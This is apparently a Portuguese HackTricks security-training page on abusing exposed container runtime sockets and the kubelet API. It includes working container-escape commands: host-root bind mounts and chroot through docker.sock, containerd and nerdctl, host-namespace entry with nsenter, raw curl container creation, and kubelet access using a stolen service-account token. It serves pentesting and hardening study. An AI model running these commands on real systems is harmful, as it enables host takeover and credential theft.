# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Muitos compromissos reais de containers não começam com um namespace escape. Eles começam com acesso ao control plane do runtime. Se um workload consegue falar com `dockerd`, `containerd`, CRI-O, Podman ou kubelet por meio de um Unix socket montado ou de um listener TCP exposto, o atacante pode conseguir solicitar um novo container com privilégios melhores, montar o filesystem do host, juntar-se aos namespaces do host ou recuperar informações sensíveis do node. Nesses casos, a runtime API é a verdadeira boundary de segurança, e comprometê-la é funcionalmente quase o mesmo que comprometer o host.

É por isso que a exposição do runtime socket deve ser documentada separadamente das proteções do kernel. Um container com seccomp, capabilities e MAC confinement normais ainda pode estar a uma chamada de API de comprometer o host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiver montado dentro dele. O isolamento do kernel do container atual pode estar funcionando exatamente como projetado, enquanto o management plane do runtime permanece totalmente exposto.

## Daemon Access Models

Docker Engine tradicionalmente expõe sua API privilegiada por meio do Unix socket local em `unix:///var/run/docker.sock`. Historicamente, ele também foi exposto remotamente por meio de listeners TCP como `tcp://0.0.0.0:2375` ou de um listener protegido por TLS na `2376`. Expor o daemon remotamente sem TLS forte e autenticação de cliente efetiva transforma a Docker API em uma interface remota de root.

containerd, CRI-O, Podman e kubelet expõem superfícies semelhantes de alto impacto. Os nomes e workflows diferem, mas a lógica não. Se a interface permite que o caller crie workloads, monte paths do host, recupere credentials ou altere containers em execução, a interface é um canal de gerenciamento privilegiado e deve ser tratada de acordo.

Os paths locais comuns que vale a pena verificar são:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks mais antigas ou mais especializadas também podem expor endpoints como `dockershim.sock`, `frakti.sock`, ou `rktlet.sock`. Eles são menos comuns em ambientes modernos, mas, quando encontrados, devem ser tratados com a mesma cautela porque representam superfícies de controle do runtime, e não sockets normais de aplicação.

## Secure Remote Access

Se um daemon precisar ser exposto além do socket local, a conexão deve ser protegida com TLS e, de preferência, com autenticação mútua, para que o daemon verifique o cliente e o cliente verifique o daemon. O antigo hábito de abrir o Docker daemon em HTTP puro por conveniência é um dos erros mais perigosos na administração de containers, porque a superfície da API é forte o suficiente para criar containers privilegiados diretamente.

O padrão histórico de configuração do Docker era assim:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Em hosts baseados em systemd, a comunicação com o daemon também pode aparecer como `fd://`, o que significa que o processo herda um socket já aberto pelo systemd em vez de fazer o bind diretamente por conta própria. A lição importante não é a sintaxe exata, mas a consequência de segurança. No momento em que o daemon escuta além de um socket local com permissões restritas, a segurança de transporte e a autenticação do cliente se tornam obrigatórias, e não um hardening opcional.

## Abuse

Se um runtime socket estiver presente, confirme qual é, se existe um cliente compatível e se o acesso bruto via HTTP ou gRPC é possível:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Esses comandos são úteis porque distinguem entre um caminho morto, um socket montado mas inacessível e uma API privilegiada ativa. Se o client tiver sucesso, a próxima pergunta é se a API pode iniciar um novo container com um host bind mount ou compartilhamento de host namespace.

### When No Client Is Installed

A ausência de `docker`, `podman` ou outro CLI amigável não significa que o socket esteja seguro. Docker Engine fala HTTP sobre seu Unix socket, e Podman expõe tanto uma API compatível com Docker quanto uma API nativa Libpod por meio de `podman system service`. Isso significa que um ambiente mínimo com apenas `curl` ainda pode ser suficiente para controlar o daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Isto importa durante post-exploitation porque defensores às vezes removem os binários client usuais, mas deixam o management socket montado. Em hosts Podman, lembre-se de que o caminho de alto valor difere entre deployments rootful e rootless: `unix:///run/podman/podman.sock` para instâncias de serviço rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para rootless.

### Full Example: Docker Socket To Host Root

Se `docker.sock` estiver acessível, o escape clássico é iniciar um novo container que monta o host root filesystem e depois fazer `chroot` nele:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Isso fornece execução direta como host-root por meio do Docker daemon. O impacto não se limita a leituras de arquivos. Uma vez dentro do novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistence ou iniciar workloads privilegiados adicionais.

### Full Example: Docker Socket To Host Namespaces

Se o atacante preferir entrada em namespace em vez de acesso apenas ao filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este caminho alcança o host ao pedir ao runtime para criar um novo container com exposição explícita ao host namespace, em vez de explorar o atual.

### Full Example: containerd Socket

Um socket `containerd` montado geralmente é igualmente perigoso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Se um cliente mais parecido com Docker estiver presente, `nerdctl` pode ser mais conveniente do que `ctr` porque expõe flags familiares como `--privileged`, `--pid=host` e `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
O impacto é novamente a compromise do host. Mesmo que tooling específico do Docker esteja ausente, outra runtime API ainda pode oferecer o mesmo poder administrativo. Em nós do Kubernetes, `crictl` também pode ser suficiente para reconnaissance e interação com containers porque ele fala diretamente com o endpoint CRI.

### BuildKit Socket

`buildkitd` é fácil de passar despercebido porque as pessoas geralmente o veem como "apenas o backend de build", mas o daemon ainda é um privileged control plane. Um `buildkitd.sock` acessível pode permitir que um atacante execute arbitrary build steps, inspect worker capabilities, use local contexts from the compromised environment, e solicite dangerous entitlements como `network.host` ou `security.insecure` quando o daemon estiver configurado para permitir isso.

Interações iniciais úteis são:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Se o daemon aceitar requests de build, teste se insecure entitlements estão disponíveis:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
O impacto exato depende da configuração do daemon, mas um serviço BuildKit rootful com entitlements permissivos não é uma conveniência inofensiva para desenvolvedores. Trate-o como outra superfície administrativa de alto valor, especialmente em CI runners e nós de build compartilhados.

### Kubelet API Over TCP

O kubelet não é um container runtime, mas ainda faz parte do plano de gerenciamento do node e muitas vezes está no mesmo debate de trust boundary. Se a porta segura `10250` do kubelet estiver acessível a partir do workload, ou se credenciais do node, kubeconfigs ou permissões de proxy estiverem expostos, o atacante pode conseguir enumerar Pods, recuperar logs ou executar comandos em containers locais do node sem nunca tocar no caminho de admissão do Kubernetes API server.

Comece com discovery barato:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Se o caminho de proxy do kubelet ou do API-server autoriza `exec`, um cliente com suporte a WebSocket pode transformar isso em execução de código em outros containers no node. Isso também explica por que `nodes/proxy` com apenas permissão `get` é mais perigoso do que parece: a requisição ainda pode alcançar endpoints do kubelet que executam comandos, e essas interações diretas com o kubelet não aparecem nos logs normais de auditoria do Kubernetes.

## Checks

O objetivo destes checks é responder se o container consegue alcançar qualquer plano de gerenciamento que deveria ter permanecido fora da trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
O que é interessante aqui:

- Um runtime socket montado geralmente é um primitivo administrativo direto, em vez de mera divulgação de informação.
- Um listener TCP em `2375` sem TLS deve ser tratado como uma condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` frequentemente revelam que o workload foi projetado intencionalmente para falar com o host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
